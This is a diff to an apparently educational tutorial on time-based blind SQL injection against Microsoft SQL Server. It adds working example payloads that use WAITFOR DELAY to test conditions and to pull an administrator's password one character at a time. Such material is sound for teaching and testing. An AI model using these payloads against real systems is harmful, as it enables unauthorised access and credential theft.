@@ -4,5 +4,13 @@ In this situation, it is often possible to exploit the blind SQL injection vulne
 
 For example, using the following techniques on an application running Microsoft SQL server, we can test a condition and trigger a time delay if the condition is true:
 ```txt
-...xyz'
+productId=1'; IF (1=2) WAITFOR DELAY '0:0:10'--
+productId=1'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
+- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
+
+Using this technique, we can retrieve any data one character at a time by submitting like the following:
+```txt
+productId=1'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 ```
